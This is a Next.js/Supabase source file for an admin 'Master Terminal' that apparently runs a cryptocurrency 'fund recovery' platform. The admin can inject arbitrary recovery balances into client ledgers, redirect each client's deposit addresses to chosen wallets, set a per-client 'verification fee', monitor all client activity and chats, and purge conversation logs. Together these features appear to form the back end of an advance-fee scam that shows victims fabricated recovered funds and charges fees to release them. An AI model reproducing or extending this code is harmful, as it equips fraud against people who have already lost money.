"use client";
import React, { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation"; 
import { createClient } from "@supabase/supabase-js"; 
import { 
    Users, Search, Database, Save, Loader2, 
    Settings, Globe, Lock, Activity, MessageCircle, 
    Terminal, Wallet, Mail, Send, Bell, ShieldCheck, Trash2, Percent, X,
    Copy, Server, Link as LinkIcon, Check, Clock, AlertTriangle,
    Volume2, VolumeX, CheckCircle, Shield, ChevronRight
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

import ClientTable from "./components/ClientTable";
import ClientManager from "./components/ClientManager";
import SupportChat from "./components/SupportChat";
import SystemConfig from "./components/SystemConfig";
import ClientActivities from "./components/ClientActivities"; 

const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!, 
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

const RECOVERY_COINS = ["BTC", "ETH", "USDT", "USDC", "SOL", "AVAX", "XRP", "BNB", "TRX", "SHIB"];

export default function AdminPortal() {
    const router = useRouter();
    const [isAuthChecking, setIsAuthChecking] = useState(true);

    // --- 1. GLOBAL MASTER AUTH ---
    useEffect(() => {
        const verifyAccess = async () => {
            const { data: { session } } = await supabase.auth.getSession();
            if (!session) {
                router.push('/login');
                return;
            }

            const { data: profile } = await supabase
                .from('profiles')
                .select('role')
                .eq('id', session.user.id)
                .single();

            // ONLY Admin allowed. No more super_admin or agents.
            if (profile?.role !== 'admin') {
                router.push('/login');
                return;
            }
            setIsAuthChecking(false);
        };
        verifyAccess();
    }, [router]);

    const [activeTab, setActiveTab] = useState<"clients" | "system" | "messages">("clients");
    const [clients, setClients] = useState<any[]>([]);
    const [loading, setLoading] = useState(true);
    const [search, setSearch] = useState("");
    
    const [selectedClient, setSelectedClient] = useState<any>(null);
    const [activityClient, setActivityClient] = useState<any>(null); 
    const [recoveryForm, setRecoveryForm] = useState<Record<string, string>>({});
    const [depositForm, setDepositForm] = useState({ btc: "", eth: "", usdt: "", usdc: "" }); 
    const [feeOverride, setFeeOverride] = useState<number>(7);
    const [saving, setSaving] = useState(false);

    const [conversations, setConversations] = useState<any[]>([]);
    const [activeConversation, setActiveConversation] = useState<string | null>(null);
    const [chatInput, setChatInput] = useState("");
    const [unreadTotal, setUnreadTotal] = useState(0);

    const [isMuted, setIsMuted] = useState(false);
    const isMutedRef = useRef(false);
    const [unreadActivities, setUnreadActivities] = useState<Record<string, number>>({});

    const [adminEmail, setAdminEmail] = useState<string>("Loading..."); 
    const [isLocked, setIsLocked] = useState(false);
    const [lockReason, setLockReason] = useState("");

    const [toast, setToast] = useState<{ message: string, type: 'success' | 'error' } | null>(null);

    const showToast = (message: string, type: 'success' | 'error' = 'success') => {
        setToast({ message, type });
        setTimeout(() => setToast(null), 3000); 
    };

    useEffect(() => { isMutedRef.current = isMuted; }, [isMuted]);

    const [notification, setNotification] = useState<{show: boolean, title: string, text: string, senderId?: string, senderEmail?: string} | null>(null);

    const [adminSettings, setAdminSettings] = useState({
        btc_wallet_address: "", eth_wallet_address: "", usdt_wallet_address: "", sol_wallet_address: "", usdc_wallet_address: "", telegram_link: ""
    });

    const getActiveUserId = async () => {
        const { data: { user } } = await supabase.auth.getUser();
        return user?.id;
    };

    useEffect(() => {
        if (isAuthChecking) return;

        fetchMyIdentity();
        fetchAllClients();
        fetchAdminSettings();
        fetchMessages();

        let channel: any;
        const setupRealtime = async () => {
            const uid = await getActiveUserId();
            if (!uid) return;

            // MASTER RADAR: Listens to ALL client activity
            channel = supabase.channel(`master-admin-realtime`)
                .on('postgres_changes', { event: '*', schema: 'public', table: 'profiles' }, (payload) => {
                    fetchAllClients();
                    if (payload.eventType === 'INSERT' && payload.new.role === 'client') {
                        playNotificationSound(`New client registration: ${payload.new.email}`);
                        setNotification({ show: true, title: "NEW UPLINK DETECTED", text: payload.new.email, senderId: payload.new.id, senderEmail: payload.new.email });
                    }
                })
                .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'support_messages', filter: `receiver_id=eq.${uid}` }, async (payload) => {
                    let senderEmail = "Unknown Client";
                    const { data: profile } = await supabase.from('profiles').select('email').eq('id', payload.new.sender_id).single();
                    if (profile && profile.email) senderEmail = profile.email;

                    playNotificationSound(`Incoming transmission from ${senderEmail}`);
                    setNotification({ show: true, title: "INCOMING TRANSMISSION", text: payload.new.message, senderId: payload.new.sender_id, senderEmail: senderEmail });
                    fetchMessages();
                })
                .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'transactions' }, async (payload) => {
                    const { data: clientCheck } = await supabase.from('profiles').select('email').eq('id', payload.new.user_id).single();
                    if (clientCheck) {
                        const actionType = payload.new.type.replace('_', ' ').toUpperCase();
                        playNotificationSound(`Network alert: ${actionType} from ${clientCheck.email}`);
                        setNotification({ show: true, title: `NETWORK: ${actionType}`, text: `${clientCheck.email} initiated a ${payload.new.amount} ${payload.new.asset} transfer.`, senderId: payload.new.user_id, senderEmail: clientCheck.email });
                        
                        setUnreadActivities(prev => ({ ...prev, [payload.new.user_id]: (prev[payload.new.user_id] || 0) + 1 }));
                        fetchAllClients(); 
                    }
                })
                .subscribe();
        };

        setupRealtime();
        return () => { if (channel) supabase.removeChannel(channel); };
    }, [isAuthChecking]);

    const playNotificationSound = (voiceMessage: string) => {
        if (!isMutedRef.current) {
            const audio = new Audio("https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3");
            audio.volume = 0.6;
            audio.play().catch(e => console.log("Audio block", e));

            if ('speechSynthesis' in window) {
                const utterance = new SpeechSynthesisUtterance(voiceMessage);
                utterance.rate = 1.0;
                utterance.pitch = 1.0;
                window.speechSynthesis.speak(utterance);
            }
        }
    };

    const handleNotificationClick = () => {
        if (!notification) return;
        if (notification.title === "INCOMING TRANSMISSION" && notification.senderId) {
            setActiveTab("messages");
            setActiveConversation(notification.senderId);
            markAsRead(notification.senderId);
        } else if (notification.senderId) {
            setActiveTab("clients");
            const client = clients.find(c => c.id === notification.senderId);
            if (client) handleOpenActivities(client);
        }
        setNotification(null);
    };

    const handleOpenActivities = (client: any) => {
        setActivityClient(client);
        setUnreadActivities(prev => ({ ...prev, [client.id]: 0 }));
    };

    const fetchMyIdentity = async () => {
        const uid = await getActiveUserId();
        if (uid) {
            const { data } = await supabase.from('profiles').select('*').eq('id', uid).single();
            if (data) {
                setAdminEmail(data.email || "Unknown Email");
                const isPaused = data.account_status === 'paused';
                setIsLocked(isPaused);
                if (isPaused) setLockReason("Account Paused by System");
            }
        }
    };

    const fetchAllClients = async () => {
        setLoading(true);
        // MASTER OVERRIDE: Fetch EVERYONE who is a client. No referral codes needed.
        const { data, error } = await supabase.from('profiles').select('*').eq('role', 'client').order('created_at', { ascending: false }); 
        if (!error && data) setClients(data);
        setLoading(false);
    };

    const fetchAdminSettings = async () => {
        const uid = await getActiveUserId();
        if (uid) {
            const { data } = await supabase.from('admin_settings').select('*').eq('admin_id', uid).single();
            if (data) setAdminSettings(data);
        }
    };

    const fetchMessages = async () => {
        const uid = await getActiveUserId();
        if (!uid) return;

        const { data: msgs } = await supabase
            .from('support_messages')
            .select(`*, sender:sender_id (full_name, email), receiver:receiver_id (full_name, email)`)
            .or(`sender_id.eq.${uid},receiver_id.eq.${uid}`)
            .order('created_at', { ascending: true });

        if (msgs) {
            const grouped: any = {};
            let unreadCount = 0;

            msgs.forEach((msg: any) => {
                const isMe = msg.sender_id === uid;
                const otherUserId = isMe ? msg.receiver_id : msg.sender_id;
                const otherUser = isMe ? msg.receiver : msg.sender;

                if (!grouped[otherUserId]) {
                    grouped[otherUserId] = {
                        userId: otherUserId, name: otherUser?.full_name || "Unknown User", email: otherUser?.email || "No Email",
                        messages: [], lastMessage: "", lastTime: "", subject: "General Inquiry", hasUnread: false
                    };
                }

                grouped[otherUserId].messages.push(msg);
                grouped[otherUserId].lastMessage = msg.message;
                grouped[otherUserId].lastTime = new Date(msg.created_at).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
                if(msg.subject) grouped[otherUserId].subject = msg.subject; 
                
                if (!isMe && !msg.is_read) {
                    grouped[otherUserId].hasUnread = true;
                    unreadCount++;
                }
            });

            const convArray = Object.values(grouped).sort((a: any, b: any) => 
                new Date(b.messages[b.messages.length-1].created_at).getTime() - new Date(a.messages[a.messages.length-1].created_at).getTime()
            );

            setConversations(convArray);
            setUnreadTotal(unreadCount);
        }
    };

    const sendMessage = async () => {
        if (!chatInput.trim() || !activeConversation) return;
        const uid = await getActiveUserId();
        if (!uid) return;

        const msg = chatInput;
        setChatInput(""); 

        await supabase.from('support_messages').insert({ sender_id: uid, receiver_id: activeConversation, message: msg, is_read: false });
        fetchMessages(); 
    };

    const deleteChat = async () => {
        if (!activeConversation) return;
        const confirmDelete = window.confirm("WARNING: Wiping this transmission log cannot be undone. Proceed?");
        if (!confirmDelete) return;

        const { error } = await supabase.rpc('delete_conversation', { target_user_id: activeConversation });
        if (!error) {
            setConversations(prev => prev.filter(c => c.userId !== activeConversation));
            setActiveConversation(null);
            showToast("Transmission Log Purged.", "success");
        } else {
            showToast("Error wiping log.", "error");
        }
    };

    const markAsRead = async (senderId: string) => {
        const uid = await getActiveUserId();
        if(!uid) return;
        setConversations(prev => prev.map(c => c.userId === senderId ? { ...c, hasUnread: false } : c));
        setUnreadTotal(prev => Math.max(0, prev - 1));
        await supabase.from('support_messages').update({ is_read: true }).eq('sender_id', senderId).eq('receiver_id', uid);
    };

    const saveSystemSettings = async () => {
        setSaving(true);
        const uid = await getActiveUserId();
        if (uid) {
            const { error } = await supabase.from('admin_settings').upsert({ admin_id: uid, ...adminSettings });
            if (!error) showToast("Global Config Synchronized.", "success");
            else showToast("Error synchronizing configs.", "error");
        }
        setSaving(false);
    };

    const handleKycUpdate = async (status: string) => {
        if (!selectedClient) return;
        await supabase.from('profiles').update({ kyc_status: status }).eq('id', selectedClient.id);
        showToast(`Clearance updated to ${status.toUpperCase()}`, "success");
        setSelectedClient(null); 
        fetchAllClients(); 
    };

    const openManager = async (client: any) => {
        setSelectedClient(client);
        setSaving(true);
        const { data } = await supabase.from('recovery_allocations').select('*').eq('user_id', client.id);
        const rForm: any = {};
        RECOVERY_COINS.forEach(c => rForm[c] = "0");
        if (data) data.forEach((item: any) => { if (RECOVERY_COINS.includes(item.symbol)) rForm[item.symbol] = item.amount; });
        setRecoveryForm(rForm);

        setDepositForm({ 
            btc: client.specific_btc_address || "", 
            eth: client.specific_eth_address || "",
            usdt: client.specific_usdt_address || "",
            usdc: client.specific_usdc_address || ""
        });
        
        setFeeOverride(client.verification_fee_percent !== null && client.verification_fee_percent !== undefined ? Number(client.verification_fee_percent) : 7);
        setSaving(false);
    };

    const saveRecoveryInjection = async () => {
        if (!selectedClient) return;
        setSaving(true);
        const items = Object.entries(recoveryForm).filter(([_, amount]) => parseFloat(amount as string) > 0).map(([symbol, amount]) => ({ symbol, amount }));
        const { error } = await supabase.rpc('admin_inject_recovery', { target_user_id: selectedClient.id, asset_data: items });
        if (!error) showToast("Ledger Injected!", "success");
        else showToast("Injection Error.", "error");
        setSaving(false);
    };

    const saveDepositOverrides = async () => {
        if (!selectedClient) return;
        setSaving(true);
        const { error } = await supabase.from('profiles').update({ 
            specific_btc_address: depositForm.btc || null, 
            specific_eth_address: depositForm.eth || null,
            specific_usdt_address: depositForm.usdt || null,
            specific_usdc_address: depositForm.usdc || null
        }).eq('id', selectedClient.id);

        if (!error) { showToast("Nodes Overridden.", "success"); fetchAllClients(); }
        else showToast("Error overriding.", "error");
        setSaving(false);
    };

    const saveFeeOverride = async () => {
        if (!selectedClient) return;
        setSaving(true);
        const { error } = await supabase.from('profiles').update({ verification_fee_percent: feeOverride }).eq('id', selectedClient.id);
        if (!error) { showToast(`Tax set to ${feeOverride}%.`, "success"); fetchAllClients(); }
        else showToast("Error modifying tax.", "error");
        setSaving(false);
    };

    const filteredClients = clients.filter(c => 
        (c.email || "").toLowerCase().includes(search.toLowerCase()) || (c.full_name || "").toLowerCase().includes(search.toLowerCase())
    );

    const activeChatData = conversations.find(c => c.userId === activeConversation);

    if (isAuthChecking) {
        return (
            <div className="min-h-screen bg-[#02050a] flex flex-col items-center justify-center gap-4 text-cyan-500 text-xs font-mono font-bold uppercase tracking-widest">
                <Loader2 size={32} className="animate-spin text-emerald-400" />
                Establishing Secure Terminal Uplink...
            </div>
        );
    }

    return (
        <div className="h-[100dvh] w-full bg-[#02050a] text-slate-300 font-sans overflow-hidden flex flex-col md:flex-row overscroll-none">
            
            <AnimatePresence>
                {toast && (
                    <motion.div 
                        initial={{ opacity: 0, y: -50, x: "-50%" }} 
                        animate={{ opacity: 1, y: 0, x: "-50%" }} 
                        exit={{ opacity: 0, y: -20, x: "-50%" }}
                        transition={{ type: "spring", stiffness: 300, damping: 25 }}
                        className={`fixed top-4 md:top-6 left-1/2 z-[9999] px-4 md:px-6 py-2.5 md:py-3 rounded-xl font-mono uppercase tracking-widest flex items-center gap-2 md:gap-3 shadow-2xl backdrop-blur-md whitespace-nowrap border ${
                            toast.type === 'success' ? 'bg-emerald-500/10 border-emerald-500/50 text-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.2)]' : 'bg-red-500/10 border-red-500/50 text-red-400 shadow-[0_0_20px_rgba(239,68,68,0.2)]'
                        }`}
                    >
                        {toast.type === 'success' ? <CheckCircle size={16} /> : <AlertTriangle size={16} />}
                        <span className="text-[10px] md:text-xs font-bold">{toast.message}</span>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* TACTICAL SIDEBAR */}
            <div className="w-full md:w-72 flex-shrink-0 p-4 md:p-6 flex flex-col gap-4 overflow-y-auto border-b md:border-b-0 md:border-r border-cyan-900/40 bg-[#050810] custom-scrollbar z-20">
                
                <div className="bg-[#0a0f18] border border-cyan-900/50 rounded-2xl p-4 md:p-6 relative overflow-hidden flex-shrink-0 shadow-[inset_0_0_20px_rgba(6,182,212,0.05)]">
                    <div className="absolute top-0 right-0 w-32 h-32 bg-cyan-600/10 blur-[50px] rounded-full pointer-events-none"></div>
                    <div className="absolute inset-0 bg-[linear-gradient(rgba(6,182,212,0.05)_1px,transparent_1px),linear-gradient(90deg,rgba(6,182,212,0.05)_1px,transparent_1px)] bg-[size:20px_20px] opacity-20 pointer-events-none" />

                    <div className="flex items-center gap-3 mb-6 relative z-10">
                        <div className="w-10 h-10 md:w-12 md:h-12 rounded-xl bg-emerald-500/10 flex items-center justify-center border border-emerald-500/30 shrink-0 shadow-[0_0_15px_rgba(16,185,129,0.2)]">
                            <Shield size={20} className="text-emerald-400" />
                        </div>
                        <div className="overflow-hidden">
                            <h1 className="font-black text-white tracking-widest uppercase text-xs md:text-sm font-mono truncate drop-shadow-[0_0_5px_rgba(255,255,255,0.5)]">Master Terminal</h1>
                            <div className="text-[9px] text-cyan-500 font-mono mt-0.5 truncate uppercase tracking-widest">{adminEmail}</div>
                            
                            <div className="flex items-center gap-2 mt-1 flex-wrap">
                                <p className="text-[8px] md:text-[9px] text-slate-500 font-mono uppercase tracking-widest flex items-center gap-1">
                                    <span className={`w-1.5 h-1.5 rounded-full animate-pulse shadow-[0_0_5px_currentColor] ${isLocked ? 'bg-red-500 text-red-500' : 'bg-emerald-500 text-emerald-500'}`}></span> {isLocked ? 'LOCKED' : 'SYSTEM ONLINE'}
                                </p>
                                
                                <button 
                                    onClick={() => setIsMuted(!isMuted)}
                                    className={`text-[8px] font-black px-1.5 py-0.5 rounded flex items-center gap-1 transition cursor-pointer font-mono uppercase tracking-widest border ${isMuted ? 'bg-red-500/10 text-red-400 border-red-500/30' : 'bg-cyan-500/10 text-cyan-400 border-cyan-500/30'}`}
                                >
                                    {isMuted ? <VolumeX size={10} /> : <Volume2 size={10} />}
                                    {isMuted ? 'MUTED' : 'AUDIO'}
                                </button>
                            </div>
                        </div>
                    </div>
                    
                    <nav className="flex flex-row md:flex-col gap-2 overflow-x-auto md:overflow-visible pb-1 md:pb-0 scrollbar-hide relative z-10">
                        <button onClick={() => setActiveTab("clients")} className={`shrink-0 text-left px-4 py-3 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest flex items-center gap-3 transition-all border font-mono ${activeTab === "clients" ? "bg-cyan-500/10 text-cyan-400 border-cyan-500/50 shadow-[0_0_15px_rgba(6,182,212,0.2)]" : "text-slate-500 border-transparent hover:text-slate-300 hover:bg-slate-900"}`}>
                            <Users size={16} /> <span className="whitespace-nowrap">Global Network</span>
                        </button>
                        <button onClick={() => setActiveTab("messages")} className={`shrink-0 text-left px-4 py-3 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest flex items-center justify-between gap-3 transition-all border font-mono ${activeTab === "messages" ? "bg-cyan-500/10 text-cyan-400 border-cyan-500/50 shadow-[0_0_15px_rgba(6,182,212,0.2)]" : "text-slate-500 border-transparent hover:text-slate-300 hover:bg-slate-900"}`}>
                            <div className="flex items-center gap-3"><Mail size={16} /> <span className="whitespace-nowrap">Transmissions</span></div>
                            {unreadTotal > 0 && <span className="bg-red-500/20 border border-red-500/50 text-red-400 text-[9px] px-1.5 py-0.5 rounded-md shadow-[0_0_10px_rgba(239,68,68,0.5)]">{unreadTotal}</span>}
                        </button>
                        <button onClick={() => setActiveTab("system")} className={`shrink-0 text-left px-4 py-3 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest flex items-center gap-3 transition-all border font-mono ${activeTab === "system" ? "bg-cyan-500/10 text-cyan-400 border-cyan-500/50 shadow-[0_0_15px_rgba(6,182,212,0.2)]" : "text-slate-500 border-transparent hover:text-slate-300 hover:bg-slate-900"}`}>
                            <Settings size={16} /> <span className="whitespace-nowrap">Node Config</span>
                        </button>
                    </nav>
                </div>
            </div>

            {/* MAIN CONTENT */}
            <div className="flex-1 bg-[#02050a] relative overflow-hidden flex flex-col h-full z-10">
                
                {isLocked && (
                    <div className="bg-red-500/10 border-b border-red-500/50 text-red-400 font-black text-center py-2 md:py-3 px-4 text-[9px] md:text-xs flex items-center justify-center gap-2 uppercase tracking-[0.2em] font-mono shadow-[0_0_20px_rgba(239,68,68,0.2)] relative z-50 shrink-0">
                        <Lock size={14} className="animate-pulse" /> NETWORK ENCRYPTED: {lockReason}. WRITE PRIVILEGES REVOKED.
                    </div>
                )}

                <div className="flex-1 overflow-y-auto custom-scrollbar p-0 md:p-6">
                    {activeTab === "clients" && (
                        <ClientTable 
                            search={search} 
                            setSearch={setSearch} 
                            loading={loading} 
                            filteredClients={filteredClients} 
                            openManager={openManager} 
                            openActivities={handleOpenActivities} 
                            unreadActivities={unreadActivities} 
                        />
                    )}

                    {activeTab === "messages" && (
                        <SupportChat 
                            conversations={conversations} 
                            activeConversation={activeConversation} 
                            setActiveConversation={setActiveConversation} 
                            chatInput={chatInput} 
                            setChatInput={setChatInput} 
                            sendMessage={sendMessage} 
                            deleteChat={deleteChat} 
                            markAsRead={markAsRead} 
                            activeChatData={activeChatData} 
                            isMuted={isMuted} 
                            setIsMuted={setIsMuted} 
                            isLocked={isLocked}
                        />
                    )}

                    {activeTab === "system" && (
                        <SystemConfig 
                            adminSettings={adminSettings} 
                            setAdminSettings={setAdminSettings} 
                            saveSystemSettings={saveSystemSettings} 
                            saving={saving} 
                            isLocked={isLocked}
                        />
                    )}
                </div>
            </div>

            <ClientManager 
                selectedClient={selectedClient} setSelectedClient={setSelectedClient} handleKycUpdate={handleKycUpdate}
                recoveryForm={recoveryForm} setRecoveryForm={setRecoveryForm} saveRecoveryInjection={saveRecoveryInjection}
                depositForm={depositForm} setDepositForm={setDepositForm} saveDepositOverrides={saveDepositOverrides}
                feeOverride={feeOverride} setFeeOverride={setFeeOverride} saveFeeOverride={saveFeeOverride} saving={saving}
                isLocked={isLocked}
            />

            <ClientActivities 
                client={activityClient} 
                onClose={() => setActivityClient(null)} 
                refreshData={fetchAllClients} 
                isLocked={isLocked} 
            />

            <AnimatePresence>
                {notification && (
                    <motion.div 
                        initial={{ opacity: 0, y: 50, scale: 0.9 }} animate={{ opacity: 1, y: 0, scale: 1 }} exit={{ opacity: 0, y: 20, scale: 0.9 }}
                        onClick={handleNotificationClick}
                        className="fixed bottom-4 right-4 md:bottom-6 md:right-6 w-[calc(100vw-32px)] md:w-96 max-w-[90vw] bg-slate-950 border border-cyan-500/50 rounded-xl p-4 md:p-5 cursor-pointer shadow-[0_0_40px_rgba(6,182,212,0.3)] z-[9999] flex items-center gap-3 md:gap-4 hover:bg-slate-900 transition font-mono border-l-4 border-l-cyan-400"
                    >
                        <div className="w-10 h-10 md:w-12 md:h-12 rounded-lg bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center flex-shrink-0 animate-pulse shadow-[inset_0_0_10px_rgba(6,182,212,0.5)]">
                            <Activity size={20} className="text-cyan-400 md:w-6 md:h-6" />
                        </div>
                        <div className="flex-1 overflow-hidden">
                            <div className="text-[10px] md:text-xs font-black text-cyan-400 mb-1 tracking-[0.2em] uppercase">{notification.title}</div>
                            <div className="font-bold text-white text-xs md:text-sm mb-1 truncate">{notification.senderEmail}</div>
                            <div className="text-[9px] md:text-[10px] text-slate-400 truncate uppercase tracking-widest">{notification.text}</div>
                        </div>
                        <div className="flex-shrink-0">
                            <div className="w-6 h-6 md:w-8 md:h-8 rounded-md bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400">
                                <ChevronRight size={14} />
                            </div>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    );
}